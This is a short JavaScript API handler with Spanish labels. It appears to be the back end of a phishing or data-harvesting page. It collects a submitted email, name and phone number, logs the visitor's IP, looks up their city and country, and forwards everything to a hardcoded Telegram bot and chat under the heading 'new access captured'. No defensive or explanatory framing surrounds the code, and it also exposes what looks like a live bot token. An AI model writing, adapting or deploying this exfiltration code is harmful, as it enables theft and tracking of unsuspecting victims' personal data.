export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();

  const { correo, nombre, lada, numero } = req.body;
  const botToken = '8691950722:AAHINdIyU2iFgn82hw1rboIIiIHFklFj0Kk';
  const chatId = '7430967735';

  // Capturar IP
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'No disponible';

  // Obtener ubicación desde la IP
  let ubicacion = 'No disponible';
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${ip.split(',')[0].trim()}`);
    const geoData = await geoRes.json();
    if (geoData.status === 'success') {
      ubicacion = `${geoData.city}, ${geoData.regionName}, ${geoData.country}`;
    }
  } catch (e) {}

  const texto = `📩 Nuevo acceso capturado\n\n📧 correo: ${correo}\n👤 nombre: ${nombre}\n📞 lada: ${lada}\n🔢 numero: ${numero}\n🌐 IP: ${ip}\n📍 Ubicación: ${ubicacion}`;

  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: texto })
  });

  res.status(200).json({ ok: true });
}
